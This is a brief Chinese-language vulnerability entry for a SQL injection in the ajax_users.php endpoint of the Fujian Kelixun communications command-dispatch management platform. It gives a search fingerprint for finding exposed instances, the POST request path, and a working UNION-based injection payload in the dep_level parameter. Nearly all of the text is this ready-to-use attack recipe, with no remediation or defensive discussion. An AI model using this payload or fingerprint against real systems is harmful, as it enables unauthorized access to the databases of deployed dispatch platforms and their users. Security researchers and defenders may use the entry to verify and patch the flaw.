# 福建科立讯通信指挥调度管理平台ajax_users.php存在SQL注入漏洞

福建科立讯通信指挥调度管理平台 ｜ SQL注入 ｜ —
- **指纹**：`body="指挥调度管理平台"`
- **请求**：`POST /app/ext/ajax_users.php HTTP/1.1`

**Payload**
```
dep_level=1') UNION ALL SELECT NULL,CONCAT(0x7e,md5(1),0x7e),NULL,NULL,NULL-- -
```